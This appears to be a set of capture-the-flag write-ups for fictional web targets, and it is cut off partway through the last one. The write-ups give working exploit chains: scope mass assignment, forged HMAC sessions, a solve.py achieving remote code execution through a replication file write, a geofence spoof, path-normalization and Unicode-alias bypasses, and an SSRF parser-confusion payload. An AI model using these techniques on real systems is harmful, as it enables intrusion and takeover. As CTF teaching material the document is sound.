Relay Desk is the Kestrel Signals operations console that Operation Dawn field units use to manage radio crypto-period rotations. Each unit is a tenant and should see only its own rotations. A rotation seals into a key bundle once two duty officers sign off, and the theatre master key stays in custody with the relay authority. An operator tagged `cyberboy` took an ordinary analyst account all the way to exporting the theatre master bundle; we hold the same analyst account (`a.reyes` / `relay-bramble-27`, unit Bramble 14) and have to repeat that path, then read the `authorization_code` inside the master bundle.

There were no downloadable files — just a per-team web container (`csctf26/web-cyberboy:1`, port 8080, reachable at `http://<instance>`), the analyst credentials, and an OpenAPI 3.0.3 spec ("Relay Desk API" v4.2.6) at `/api/openapi.json`. The flag is a per-team random value with a 24-character body.

**Approach / walkthrough**

Without source, the spec is the attack surface. A scope-locked recon script (`workspace/9126-cyberboy/cyberboy_recon.py`) was prepared first: it talks only to the given HOST:PORT, caps requests (default 60), waits 0.25 s between them, fetches the spec, lists every operation, logs in, and walks each documented GET. Its first pass made 8 requests but used a wrong hard-coded login body (`operator`/`passphrase` instead of the spec's `username`/`password`), so its GETs all returned 401. The manual solve that followed took about 13 paced requests. Total: ~21 requests to the assigned host.

The operation descriptions in `openapi.json` give each bug away:

| Operation | Spec description (abridged) | What it implies |
| --- | --- | --- |
| `PATCH /api/profile` | "duty_assignment ... feeds the session scope at the next refresh." | The user can edit their own tenant scope |
| `POST /api/profile/refresh` | "Re-reads duty_assignment and re-issues the session with that unit as the effective scope." | The edited scope is written into the session |
| `POST /api/rotations/{ref}/approve` | "Records an approval under the acting officer's signatory **display name**." | Approver is identified by a user-controlled field |
| `POST /api/rotations/{ref}/delegate-approval` | "Body: {delegate_id}. An account already holding a delegated slot is refused." | Only the delegate slot is checked, not the caller |
| `POST /api/rotations/{ref}/export` | "Body: {tier}. Seals the rotation's key bundle **at the named tier**." | The client chooses the export tier |

1. **Log in as the analyst.**

```
POST /api/session  {"username":"a.reyes","password":"relay-bramble-27"}
-> 200 {"account_id":"usr_reyes","scope":"BR-14","display_name":"A. Reyes"}
```

`GET /api/profile` returns role `analyst`, with `home_unit` and `duty_assignment` both `BR-14`. `GET /api/units` lists six units, including **`KL-01` "Kestrel Lead / Theatre Relay Authority"**, the tenant holding custody of the master key. In scope BR-14, `GET /api/rotations` and `GET /api/bundles` return only Bramble 14's field-tier data.

2. **Move into the relay authority's tenant (mass assignment of scope).** `duty_assignment` is a profile field the user can edit, and the server takes the session's tenant scope from it without checking whether the account is actually posted there:

```
PATCH /api/profile          {"duty_assignment":"KL-01"}
-> 200 {"account_id":"usr_reyes","display_name":"A. Reyes","duty_assignment":"KL-01"}

POST  /api/profile/refresh
-> 200 {"account_id":"usr_reyes","scope":"KL-01"}
```

The analyst is now scoped to the Theatre Relay Authority. `GET /api/units/KL-01/staff` returns the three KL-01 duty officers (Castellan, Okonkwo, Delacroix), and `GET /api/bundles` returns KL-01's sealed `theater`-tier bundles.

3. **Find a rotation that already has both sign-offs.** `GET /api/rotations` (now KL-01) returns 11 theater-tier rotations. Refs have the form `rr_` + base64url(`<unit>:<seq>`) + `.` + MAC — for example `rr_S0wtMDE6OQ` decodes to `KL-01:9`. **Seq 9** (`rr_S0wtMDE6OQ.303822af625d3926`, crypto-period `DAWN-KILO-09`) is already `status: approved`: a `Maj. R. Castellan` approve plus a `usr_okonkwo` delegated approval, and `bundle_id: null` (no bundle yet). The two-officer rule was already met, so nothing had to be forged. (Seq 7, `rr_S0wtMDE6Nw.d016bb1042224d66`, was also approved and unexported; we used seq 9 and did not try seq 7.)

4. **Raise the export tier (the client picks the tier).** The rotation is authorized at `theater`, but `export` seals at whatever tier the body names and never checks it against `authorized_tier`:

```
POST /api/rotations/rr_S0wtMDE6OQ.303822af625d3926/export  {"tier":"master"}
-> 200
{
  "bundle": {
    "bundle_id": "SEAL-635A3634B5",
    "tier": "master",
    "custody": "theatre",
    "unit": "KL-01",
    "crypto_period": "DAWN-KILO-09",
    "rotation_ref": "rr_S0wtMDE6OQ.303822af625d3926",
    "key_fingerprint": "2a:86:c9:50:35:6c",
    "authorization_code": "CSCTF{Mebs9EZklOy3r222MfBkzrTn}",
    "sealed_at": "2026-11-06T14:09:52Z"
  }
}
```

The `authorization_code` is the flag.

**Why it works**

There are two separate authorization failures. First, the tenant boundary comes from `duty_assignment`, a profile field the user can write, and the server never checks it against the account's real posting — mass assignment of the session scope. Second, the export endpoint takes the seal tier from the request body and does not enforce the rotation's `authorized_tier`, so any approved theater rotation can be exported as a master bundle. The spec also exposes a third flaw we did not need: `approve` identifies the signer only by the editable `display_name`, and `delegate-approval` only checks the delegate slot, so one account could set its display name to an approver, call `approve`, then delegate to a second approver's account id to produce both sign-offs. That matters only if no rotation is already approved; seq 9 already was, so we did not run it on the instance (unverified).

**Validation / reproduction**

The export response was a bundle with `tier: master` and `custody: theatre`, and its `authorization_code` had a 24-character `CSCTF{...}` body matching the challenge's `flag_mode: random` / `random_flag_length: 24`. It was accepted on the first submission, submitted once through the CLI as `correct` (`tried.json`, 2026-11-06 14:10:31 UTC).

Reproduction in short: log in as `a.reyes`; `PATCH /api/profile {"duty_assignment":"KL-01"}` then `POST /api/profile/refresh`; `GET /api/rotations`, decode a ref's base64url middle to find an already-approved seq (seq 9); `POST /api/rotations/<ref>/export {"tier":"master"}`; read `authorization_code`.

Gotchas: the recon script's hard-coded login body (`operator`/`passphrase`) does not match the spec's `{username, password}`, so its first-pass GETs are all 401 — switch to the spec's fields for the manual requests. Every request went to our own assigned instance; no scanning, flooding, or flag guessing.

### Helioform Relay

> Web · Not shown · Ahmed Abdelmoemen  
> Points: 682 · Flag submitted by: [JohnG4lt](https://github.com/j0hn-G4lt)

**The flag**

`CSCTF{...}` — printed by a Python runbook that reads `/tmp/flag` on the appliance and is surfaced
through `/console/automation`. JohnG4lt holds the credited solve; the route and `solve.py` below are his.
The literal flag string was read from the live console page and not saved (the instance is now closed).

**Challenge**

A Helioform Relay 4.2 appliance sits at the edge of the Kovari National Grid. There are no handout files.
A single service on port 8080 exposes the public protocol docs (`/docs/hsp`, `/docs/session`), a `/mesh`
WebSocket, and a locked `/console` (login at `/console/login`; `/console` itself returns 401). The brief
points at "a path the provisioner never closed" between the legacy agent wire and the compliance ledger,
and asks you to walk the appliance end to end.

**Approach**

The service is not a website; it is a protocol. Start from the visible HTTP pages, then follow the links
in `/docs/hsp` and `/docs/session` — they describe `/mesh` and its raw HSP mode, and the admin console
(once opened) documents the scheduler. One thing to keep straight: `/var/lib/helioform/runbooks` is a
*backend filesystem path* disclosed by `/console/automation`, not an HTTP route found by directory
fuzzing.

1. **HSP framing.** A frame is the magic `HSP1`, then a `u16` opcode, `u16` flags (bit 0 marks a reply),
   a `u32` little-endian length, and the body. Opcode `0x7F` is an error frame whose body is a short
   `err: …` string.
2. **The legacy agent wire.** `/mesh` accepts two subprotocols. `hsp.ws.1` is the normal masked-binary
   mesh. `hsp.raw.1` is the interesting one: after the 101 upgrade it speaks raw HSP. Send
   `DIAL` (opcode `0x10`) with a `host:port` body; only literal loopback (`127.0.0.1:<port>`, whitespace
   trimmed, last-colon split) is accepted, and it replies `ok splice`, then raw-forwards to that loopback
   port with no agent authentication. (Changing or omitting the `auth: legacy-proxy` header does not
   affect this lane; non-loopback destinations are denied.) The legacy wire is an open, unauthenticated
   loopback proxy into the appliance.
3. **Mint a service ticket (catalogd, 7710).** Through the splice, opcode `0x01` with a client label
   returns a `nonce`; opcode `0x20` with that nonce returns a `ticket` (`tkt.<nonce>.<16B-sig>`, TTL
   ~600s). Other advertised catalog operations are not implemented — this ticket flow is the useful path.
4. **Read the factory env (provd, 7711).** Opcode `0x30` with fields `ticket` and `path` is a dotenv
   loader bounded to `/etc/helioform/*.env` (realpath is resolved before the boundary is enforced;
   traversal and non-env paths return `err: dotenv loader refuses non-env path`; `/etc/passwd` and
   nonexistent `.env` names are refused — this is not general file disclosure). Two files exist:

   ```text
   relay.env:     CONSOLE_MAC_KEY=7f3c9a2e1b84d056a0c3e91f44b7d2aa
                  REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
                  CONSOLE_ISS=helioform-factory   CONSOLE_AUD=relay-console
                  MESH_CAPTURE_ENABLED=1
   collector.env: COLLECTOR_PEER=relay-collector  INTERVAL=5
                  LOG_ROOT=/var/log/helioform/streams   SITE_ID=north
   ```

5. **Forge the console cookie.** `/docs/session` defines `hsp_session` as
   `base64url(JSON{iss,aud,role,exp})` + `"."` + `hex(HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64))`. With
   `CONSOLE_MAC_KEY`, build a payload with `role:"admin"`, `iss:"helioform-factory"`,
   `aud:"relay-console"`, and a future `exp`, MAC it, and the cookie opens `/console`, `/console/trace`,
   and `/console/automation`. `/console/trace` hands you the `hsp-repl/1` decoder and the exact canonical
   MAC strings; `/console/automation` discloses the runbook directory `/var/lib/helioform/runbooks`, the
   required `HSP-RUNBOOK` header, the five-second / on-write trigger, and the output page.
6. **Replication status (recordd, 7712).** Opcode `0x40` with the ticket returns the live `epoch`, `tip`
   (32-byte, 64 hex), `bind` (16-byte, 32 hex), and the replication port 7713. Fetch this immediately
   before each write — stale tips are rejected, and a successful commit advances the tip. (Genesis
   constants observed independently: `tip=eaf165d4f6bf5f5c9a467be869ddc99fc3ef0b44c7e3e15566597a4a577ba6ce`,
   `bind=d15d1514d50edc494903cfb615f56920`.)
7. **Authenticate to the replica (7713).** HELLO is opcode `0x11`, body
   `u16 peer_len | peer | u32 epoch | tip[32] | mac[32]`, where the peer MUST be `relay-collector` and
   `mac = HMAC(REPLICATION_MAC_KEY, "hsp-repl/1|hello|{epoch}|{tip_hex}|relay-collector")`.
8. **Write and execute a runbook.** The commit is opcode `0x17`, body
   `u16 path_len | path | u8 mode | u32 epoch | tip[32] | bind[16] | u32 body_len | body | mac[32]`, where
   mode `0x01` ("replace resolved file") is the only valid mode and
   `mac = HMAC(REPLICATION_MAC_KEY, "hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{path}|{sha256hex(body)}")`.
   Write `path=/var/lib/helioform/runbooks/solve` with a body beginning `HSP-RUNBOOK\n`. Runbook bodies
   execute as **Python** (a shell-style first payload produced a Python `NameError`, which is how this was
   discovered), so the body is `print(open("/tmp/flag").read().strip())`. Poll `/console/automation` with
   the admin cookie; within a trigger interval it shows the runbook's output — the flag.

```python
# core of solve.py — ticket, env, cookie, replication write, poll
cat = HSP(host, port, "127.0.0.1:7710")
nonce  = fields(cat.request(0x01, b"solver"))[b"nonce"]
ticket = fields(cat.request(0x20, nonce))[b"ticket"];  cat.close()

prov = HSP(host, port, "127.0.0.1:7711")
keys = fields(prov.request(0x30, b"ticket=" + ticket + b"\npath=/etc/helioform/relay.env\n"))
prov.close()
mac_key, repl_key = keys[b"CONSOLE_MAC_KEY"], keys[b"REPLICATION_MAC_KEY"]
iss, aud = keys[b"CONSOLE_ISS"], keys[b"CONSOLE_AUD"]

payload = base64.urlsafe_b64encode(json.dumps({
    "iss": iss.decode(), "aud": aud.decode(), "role": "admin",
    "exp": int(time.time()) + 3600}).encode()).rstrip(b"=")
cookie = payload + b"." + hmac.new(mac_key, payload, hashlib.sha256).hexdigest().encode()

rec = HSP(host, port, "127.0.0.1:7712")
st = fields(rec.request(0x40, b"ticket=" + ticket + b"\n"));  rec.close()
epoch = int(st[b"epoch"]); tip = bytes.fromhex(st[b"tip"].decode()); bind = bytes.fromhex(st[b"bind"].decode())

body = b'HSP-RUNBOOK\nprint(open("/tmp/flag").read().strip())\n'
path = "/var/lib/helioform/runbooks/solve"
hello_mac = hmac.new(repl_key, f"hsp-repl/1|hello|{epoch}|{tip.hex()}|relay-collector".encode(), hashlib.sha256).digest()
hello = struct.pack("<H", len(PEER)) + PEER + struct.pack("<I", epoch) + tip + hello_mac
digest = hashlib.sha256(body).hexdigest()
blob_mac = hmac.new(repl_key, f"hsp-repl/1|blob|{epoch}|{tip.hex()}|{bind.hex()}|{path}|{digest}".encode(), hashlib.sha256).digest()
blob = struct.pack("<H", len(path)) + path.encode() + b"\x01" + struct.pack("<I", epoch) + tip + bind \
     + struct.pack("<I", len(body)) + body + blob_mac
repl = HSP(host, port, "127.0.0.1:7713"); repl.request(0x11, hello); repl.request(0x17, blob); repl.close()
# then GET /console/automation with Cookie: hsp_session=<cookie> and read CSCTF{...}
```

(The full `solve.py` carries the `HSP` WebSocket/frame helper, the `stale tip` retry loop that re-fetches
recordd state and rebuilds both MACs, and the `/console/automation` poll.)

**The deployment-permission detour (honest account).** On the first deployment, the signed write to
`/var/lib/helioform/runbooks` returned `err: open failed`; writes to flat `/tmp` and `/dev/shm` succeeded
but the scheduler stayed `idle`. We exhausted the alternatives — path traversal, `/proc` paths, process
fds/cwd, queue/staging dirs, pre-planted symlinks, scheduler output files, and whether `/tmp` or
`/dev/shm` were scanned — and none reached the executor. The `/proc` sweep found only std{in,out,err}.
The first deployment refused writes to the intended target. After the instance was updated, the identical signed write to `/var/lib/helioform/runbooks/solve` succeeded and the runbook executed.

**Why it works**

The edge keeps a legacy agent transport that proxies to any loopback port without authentication, which
collapses the separation between the public front and the internal services. Those services then hand out
the factory secrets, so the console HMAC and the replication MAC protect nothing: with both keys you forge
an admin session and sign your own replication records. The replica's mode-`0x01` commit is an
absolute-path file write, and the scheduler executes anything in the runbook directory as Python — so a
single signed write is remote code execution. The `edge.dial` scope belongs to the separate customer
WebSocket lane and is not needed for raw loopback DIAL; some advertised catalog operations are
unimplemented decoys.

**Validation**

`solve.py` automates the ticket, env export, cookie, replication status/hello/blob flow, and output poll.
On the fixed Helioform instance the blob write returned `ok path=/var/lib/helioform/runbooks/solve` and
the solver recovered the flag from `/console/automation`. The credited solve was recorded on CTFd on
6 Nov at 23:21 UTC. secretNinja independently reproduced the chain through the authenticated replication
writer (matching keys and genesis constants above) on an instance that pre-dated the permission fix, which
is why his workspace stopped short of the flag. If a write fails with `stale tip`, re-fetch recordd state
and rebuild both MACs in the fresh window.

### Inside the Cordon

> Web · Medium · Chronos Security  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{yg4hpNcoXdPx28pleOe9DUx4}
```

This is a per-team random flag (24 characters), recovered from the WebSocket `room.snapshot` frame
on our assigned instance.

**Challenge**

> A seized coordination station was used to get inside Cordon Seven while the national fuel corridor
> that feeds allied units in Operation Dawn was being rerouted. The operator PIN is gone. Reproduce
> the access path and recover the protected briefing. Everything you need is in the application; do
> not contact real systems.

It is a per-team container (`csctf26/web-inside-the-cordon:1`, port 8080), spawned through the
`docker_per_team` CTFd plugin. There were no attachments and no source — the running application was
the only input. All traffic was scoped to the assigned instance (`<instance>`).

Narratively it is a geofenced access-control app. An operator enters a **PIN**, which unlocks a
WebSocket channel; the channel only releases the protected "room" briefing once the station reports a
**position inside Cordon Seven**. The PIN is "gone," so the intended solve is to break the trust
boundaries, not to recover the PIN.

**Approach / walkthrough**

*Recon.* A paced, read-only pass (15 GETs, bodies and headers saved under `recon/`) mapped the app.
The server identifies itself as `VicinityWire`; unknown routes return `{"code":"NOT_FOUND"}`. No
`robots.txt`, `openapi.json`, `/api/v1/schema`, `.git`, or sourcemap existed — they all returned the
`NOT_FOUND` body, so the saved `recon/app.js.map` and schema files hold only that 404, not real
content. `GET /` sets an **opaque session cookie** `station=<43-char base64url>` (HttpOnly,
SameSite=Strict, Max-Age=1800). It is **not** a JWT, so there is no `alg:none` or weak-secret forge.
A tight CSP is set (`default-src 'none'`, `connect-src 'self' ws: wss:`). Together that said: logic
challenge, not XSS/injection.

The whole client lives in `recon/app.js` (6.5 KB, unminified) — the key artifact. It names the
endpoints and, in a comment, the bug:

- `POST /api/station/pin-check {"pin":"NNNNNN"}` → `{success, code, attempt, expires_in_ms}`. An
  `attempt` id comes back **even when the PIN is wrong**.
- `POST /api/station/activate {"attempt":<id>}` → `{cap, room, lat_e6, lon_e6, radius_m, server_time_ms}`.
- `GET /api/station/session` → session liveness.
- `GET /ws` → the WebSocket channel. Frames carry a monotonic `sequence`; each server reply returns a
  `next_sequence` the client must echo on its next frame.

*Vulnerability 1 — client-side trust boundary on activation.* `app.js` states it in a comment:

```js
// (abridged from recon/app.js, pin-form submit handler)
if (!response.ok) { pinStatus.textContent = `Check failed: ${result.code}.`; return; }
// Deliberately wrong trust boundary: the browser's local branch decides whether to activate.
const attempt = result.attempt;
if (!result.success) { pinStatus.textContent = `PIN rejected (${result.code}). Attempt ${attempt} expires in ...`; return; }
const activation = await fetch('/api/station/activate', {method:'POST', ..., body:JSON.stringify({attempt})});
```

The browser is the only thing that checks `result.success`. The server hands back a valid `attempt`
id on a **failed** PIN check, and `activate` trusts that id without ever confirming the PIN
succeeded. So any wrong 6-digit PIN yields a usable `attempt`, and activating it returns the real
`cap`, the room id, and the cordon centre (`lat_e6`, `lon_e6`) and `radius_m`. **No PIN brute force
is needed** — the "PIN is gone" framing is a red herring, and sweeping PINs was explicitly ruled out
as a flooding/brute-force concern.

*Vulnerability 2 — client-reported geolocation.* Over the WebSocket the browser authenticates with
`cap`, then calls `reportOutside()`, which sends a hard-coded outside position (`app.js` labels it the
"Synthetic station position": `latitude:-47.200610, longitude:-126.302400, accuracy_m:18.0`; the map
text says the station "starts outside"). The server computes `inside`/`distance_m` from the
client-supplied coordinates — nothing server-side vouches for the position. Since `activate` already
leaked the exact centre and radius, we report the centre instead of the decoy and are ruled inside.

The only server-side rigor is procedural: the strict `sequence` the client must echo, a
position-freshness window (`freshness_ms`), and a rate allowance (`limit` frames per `window_ms`).
These are honored with a client-side limiter, not bypassed.

*Exploit path* (`exploit/live.py`, one short sequential run, a handful of frames, no loops/sweeps):

1. `GET /` to obtain the opaque `station` cookie.
2. `POST /api/station/pin-check {"pin":"000000"}` — one wrong PIN, no sweep — and take `attempt` from
   the failure response.
3. `POST /api/station/activate {"attempt": attempt}` → `{cap, room, lat_e6, lon_e6, radius_m, ...}`.
4. Open `/ws` with the same cookie and `Origin` set to the base URL. Send
   `{"type":"station.authenticate","sequence":1,"cap":cap}`; read `station.accepted` for
   `next_sequence`, `limit`, `window_ms`.
5. Send `position.update` at the leaked centre (`lat_e6/1e6`, `lon_e6/1e6`), with `observed_at_ms`
   from the current time (inside the freshness window) and a small `accuracy_m` (`min(1.0,
   radius_m/2)`, i.e. at most 1 m). Read `position.accepted` with `inside:true` and `eligible_room`.
6. Send `{"type":"room.join","sequence":next_sequence,"room":eligible_room}`. The `room.join` frame
   type is **not** in `app.js` — the client never joins — so it was inferred from the message
   vocabulary (`room.snapshot`, `eligible_room`); the script sends it once and it was accepted. The
   server replies `room.snapshot` with `classification`, `briefing`, and `clearance_token`.

`app.js` renders the snapshot as `${classification}: ${briefing} ${clearance_token}`. Which field
carried the flag was not recorded (`clearance_token` is the likely one, an inference); `live.py`
extracts it with a `CSCTF\{[^}\s]+\}` regex over the whole serialized frame. The output below is the
*shape* the script prints, not a saved transcript (the live log was not kept):

```bash
.venv/bin/python workspace/9107-inside-the-cordon/exploit/live.py
# pin-check: {"success": false, ...}
# activate: {"room": ..., "lat_e6": ..., "lon_e6": ..., "radius_m": ...}
# ws: {"type":"station.accepted", ...}
# ws: {"type":"position.accepted","inside":true, ...}
# ws: {"type":"room.snapshot", ...}   (contains CSCTF{...} in one of its fields)
# FLAG: CSCTF{yg4hpNcoXdPx28pleOe9DUx4}
```

**Why it works**

Two classic web trust failures are stacked. First, a **client-side authorization branch**: only the
browser checks whether the PIN succeeded, while the server issues a usable `attempt` on a failed
check and `activate` honors it without rechecking — so the operator-PIN gate falls to one wrong
guess, and `activate` discloses the geofence centre and radius. Second, **client-controlled
geolocation**: the server derives `inside` purely from the coordinates the `position.update` frame
reports, and the centre is already known, so reporting the centre instead of the hard-coded decoy is
ruled inside. The `sequence`/freshness/rate machinery only constrains the order and timing of frames;
nothing in it verifies who the station is or where it really is.

**Validation / reproduction**

The script refuses to finish unless it receives `position.accepted` with `inside:true` and then a
`room.snapshot` matching the `CSCTF{...}` regex; the extracted per-team flag was accepted on the
first guarded submission (`tried.json`: one attempt, `correct`). A Codex child-agent returned the
final flag for this challenge, so the solve is credited to Codex (run under human steering; byline:
secretNinja) — but the exact mechanics were not fully re-traced from its session, and the steps above
come from our saved notes rather than a Codex transcript.

Repro summary: `GET /` for the cookie → wrong PIN to get an `attempt` → `activate` for `cap` plus the
leaked centre/radius → authenticate on `/ws`, echoing each `next_sequence` → `position.update` at the
centre with fresh `observed_at_ms` and sub-metre accuracy → `room.join` the `eligible_room` → read
the flag from `room.snapshot`.

Gotchas: send everything with the same `station` cookie (SameSite=Strict, 1800 s), and set `Origin`
to the base URL on the WS upgrade. Echo `next_sequence` exactly and keep `observed_at_ms` inside the
freshness window; the `room.join` frame name is not in `app.js` and was inferred from the protocol's
other names.

### Interdiction Hold

> Web · Easy · Chronos Security  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{blVXN5kcjCbYG933eqitJycR}`

**Tools used**

None beyond standard CLI utilities.

**Challenge**

"A broker acting for a hostile state moved an embargoed dual-use shipment through the Orsvane Border Revenue Service's freight clearance portal, and the interdiction hold on it came off. Nobody on the duty desk can say how. You have been given access to the same portal. One consignment in its queue is under an interdiction hold. Get it released and read the clearance token printed on its release certificate. The portal documents its interface at `/schema`."

No files were attached. The target is a per-team web container (`csctf26/web-interdictionhold:1`, port 8000, at `http://<instance>`) started from the challenge page. All requests went only to our own instance. The flag is a per-team random value, 24-character body, fixed for an instance.

**Approach / walkthrough**

Triage sent this to the web playbook (`docs/playbooks/web.md`). Because the brief advertises self-documentation at `/schema`, the first move is to read that documentation and the portal's reference data before sending any request that changes state.

1. **Read the approval model from `/schema`.** The schema describes two controls that guard a release:
   - **Approval binding.** An approval stores `manifest_hash`, a SHA-256 over a fixed list of `covered_fields`: `ref`, `origin`, `destination`, `declared_value_eur`, `carrier`, `lineitems[].description`, `lineitems[].quantity`.
   - **Release preconditions.** `POST /consignments/{ref}/release` succeeds only when the approval is `APPROVED` and the stored `manifest_hash` equals the hash of the consignment as it is now, and no line item carries an HS code on the embargo list.

2. **Spot the gap.** Comparing the two rules: the embargo check reads `lineitems[].hs_code`, but `hs_code` is **not** one of the hashed `covered_fields`. The integrity hash that freezes the approved manifest leaves out the exact field a later security decision depends on.

3. **Find the held consignment and the embargo list.**
   - `GET /embargo-list` returned six embargoed HS codes: `8409.99, 8536.90, 8544.42, 9014.80, 9032.89, 9306.90`.
   - Consignment **`MFC-UF52GPW`** had status `HELD`, and its approval was already `APPROVED`. The only thing blocking release was line item 0, whose `hs_code` was `8544.42`, which is on the embargo list.

4. **Amend the uncovered field after approval.** The portal allows line-item amendments after approval (the PATCH takes a `justification` field). Because `hs_code` is outside the hashed set, changing it leaves `manifest_hash` unchanged — so the approval still matches and is not re-opened — while moving the line item off the embargo list:

```http
PATCH /consignments/MFC-UF52GPW/lineitems/0
Content-Type: application/json

{"hs_code": "8543.70", "justification": "..."}
```

`8543.70` is just a code not on the embargo list; any code outside that list would have done the same job.

5. **Release and read the certificate.**

```http
POST /consignments/MFC-UF52GPW/release
```

The consignment changed to `RELEASED`, and its release certificate carried `clearance_token = CSCTF{blVXN5kcjCbYG933eqitJycR}`.

**Why it works**

This is a partial integrity binding — a TOCTOU-style approval bypass. The approval signs off a hash of the manifest, but the hash leaves out a field (`lineitems[].hs_code`) that a later release control reads. Changing that field after approval does not alter `manifest_hash`, so the approval stays valid and is not reopened, and the embargo check passes on the new code. In the story, this is exactly how the hostile broker lifted the hold. The fix is to hash every field that any release control reads (here the HS code, and in practice the whole line item), or to reset the approval to pending on any post-approval amendment.

**Validation / reproduction**

The release call returned the consignment as `RELEASED`, and the certificate's `clearance_token` had the 24-character `CSCTF{...}` per-team format. It was submitted once through the project CLI (notes: "manual cli submit") and accepted as correct on the first try — `tried.json` records one attempt, status `correct`, at 2026-11-07 13:07:46 UTC, under eight minutes after Wave 2 opened at 13:00 UTC. The challenge's one hint (5 pts) was not unlocked.

Reproduction in short: read `/schema` and note that `hs_code` is outside `covered_fields`; `GET /embargo-list`; find the `HELD`, already-`APPROVED` consignment (`MFC-UF52GPW`) whose line item 0 carries an embargoed code; PATCH that line item's `hs_code` to any non-embargoed code; POST the release and read `clearance_token`.

Gotchas and scope: nothing was fuzzed, scanned, or brute-forced; the chain is read `/schema`, read `/embargo-list`, look up the held consignment, one PATCH, one release. No session or auth header is noted as required.

### Interlock

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 593 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{nkoohtMwUPVjl7ZpLjm9Ejid}
```

Recovered from the HTTP 200 isolation receipt on the assigned live instance, then submitted through the guarded path after a team-solve check and accepted on the first submission.

**Challenge**

A forged protection setting-group has been loaded into the Keld Ridge substation cluster on Velmara's eastern interconnection, set to trip 2.1 GW and split the eastern grid. At 02:48 a compromised engineer account also put Keld Ridge on the dispatcher's quarantine list, so the dispatcher refuses to send the cluster anything. Our observer desk is read-only, and the cluster still has to be isolated. A dispatchable isolation order needs **dual control** — a requester and an approver, both on the engineer roster and not the same principal. When an order actually reaches the substation gateway, the gateway returns an isolation receipt carrying the clearance code (the flag). The reliability console sits at the root of the dispatcher edge and links the operations API schema at `/api/v1/schema`. The brief tells us to use a client that sends the path exactly as typed (e.g. `curl --path-as-is`), because some clients rewrite escaped path segments before the request leaves the machine. There are no attachments, so this is black-box work against our own instance only.

**Tools used**

Codex (run under human guidance), which developed and ran the request chain against the live instance and submitted the accepted flag. Tooling: `curl --path-as-is` and a small paced raw-socket driver that sends paths byte for byte, plus Python `unicodedata` and `hashlib`, used offline to check aliases and the unlock digest.

**Approach / walkthrough**

The `--path-as-is` hint already tells us the edge and the backend parse paths differently; the dual-control rule says principal identity is checked somewhere that two spellings of one name can fool; the quarantine says the dispatch-target check must be bypassed. The console root ("VNTA Reliability Console | Keld Ridge", "Observer session, read-only") links `/api/v1/schema`, `/reference/roster` and `/audit/ledger`. The schema maps the whole chain:

```json
{
  "edge": { "policy": "authorizes on the request path as received" },
  "cluster": { "buses": ["KR-B1", "KR-B2"], "gateway": "<gateway>" },
  "dual_control": { "requester": "roster", "approver": "roster", "distinct": true },
  "delegates": { "uniqueness": "casefold" },
  "operations": { "endpoints": [
    { "method": "POST", "path": "/ops/delegates",      "body": ["name"] },
    { "method": "POST", "path": "/ops/orders",         "body": ["bus","requester_token"] },
    { "method": "POST", "path": "/ops/orders/approve", "body": ["order_id","approver_token"] },
    { "method": "POST", "path": "/ops/dispatch",       "body": ["order_id","target","unlock"] }
  ]},
  "dispatch": {
    "target_validation": { "parser": "fast-uri", "version": "3.1.2" },
    "release_unlock": {
      "algorithm": "sha256-hex",
      "input": "interlock|<order_id>|<bus identifiers joined by comma>"
    }
  }
}
```

The roster lists the engineers `k.vostra`, `r.mendal` and `a.torvo`, with matching rule **NFKC+casefold**. Four guards, each with a weakness: the edge checks the path *as received* while the backend normalizes dot-segments; delegate uniqueness uses `casefold` while roster membership uses NFKC+casefold; the dispatch target is validated with `fast-uri@3.1.2` but the request is sent by Node's WHATWG fetch; and the release unlock is a published SHA-256 the client can compute.

*Stage 1 — edge path check.* A literal `POST /ops/delegates` returns `403 policy.path_restricted`. Encodings tried on the live instance:

| Path sent | Result |
| --- | --- |
| `/ops/...` | 403 `policy.path_restricted` |
| `/%6fps/...` | 403 (the edge still matches) |
| `//ops/...` | 404 (backend sees the wrong route) |
| `/./ops/...` | **reaches the backend** (201 on delegates) |
| `/reference/../ops/...` | reaches the backend |
| `/%2e/ops/...` | reaches the backend |

From here every operator call is sent as `/./ops/*` with `--path-as-is`, so the dot-segment is not collapsed before it goes on the wire. The edge matches on the literal path and does not strip `/./`; the backend collapses it to `/ops/...` and routes normally.

*Stage 2 — two roster principals via a normalization mismatch.* We need two **distinct** delegates that are **both** on the roster. Uniqueness only casefolds, while the roster check applies NFKC first, so a compatibility character that NFKC maps to `a` creates a "new" principal that still matches a real engineer. Checked offline with `unicodedata`:

| Name sent | `casefold()` | `NFKC` + `casefold()` |
| --- | --- | --- |
| `k.vostrª` (U+00AA) | `k.vostrª` | `k.vostra` |
| `r.mendªl` (U+00AA) | `r.mendªl` | `r.mendal` |

`k.vostra` plain already existed (`409 principal.exists`). The final run aliased two *different* engineers so the two tokens map to two real roster entries:

```text
POST /./ops/delegates  {"name":"k.vostrª"}  -> tok-1
POST /./ops/delegates  {"name":"r.mendªl"}  -> tok-2
```

Both pass the distinctness check (their casefold forms differ) and both match the roster (their NFKC+casefold forms are real engineers). Saved earlier-run captures show the same mechanism with circled/fullwidth-a aliases and `"dual_control":{...,"same_principal":false}` on the resulting order.

*Stage 3 — create and approve a two-bus order.*

```text
POST /./ops/orders          {"bus":["KR-B1","KR-B2"],"requester_token":"tok-1"}  -> ord-3 / awaiting_approval
POST /./ops/orders/approve  {"order_id":"ord-3","approver_token":"tok-2"}         -> signed
```

`bus` **must be a JSON array**: a scalar `"bus":"KR-B1"` made the approve call return `502 upstream.unavailable` and took the instance down. With two delegates created first, the order id is deterministically `ord-3`.

*Stage 4 — unlock digest and quarantine bypass.* The unlock follows the schema formula, recomputed offline:

```text
sha256("interlock|ord-3|KR-B1,KR-B2") = 56da3ce31e46feda7a23e5715791c00e0c60678e4be57eb9a5c9c3f31c4ab838
```

(Joining both buses matters: `sha256("interlock|ord-3|KR-B1")` gives a different `a334c5e3...` digest.) A plain `http://<gateway>/` target returns `target.quarantined`. The validator is `fast-uri@3.1.2`; the request is made by Node's WHATWG fetch; the two parse a backslash in the authority differently:

```json
{
  "order_id": "ord-3",
  "target": "http://<gateway>\\@example.invalid/../dispatch",
  "unlock": "56da3ce31e46feda7a23e5715791c00e0c60678e4be57eb9a5c9c3f31c4ab838"
}
```

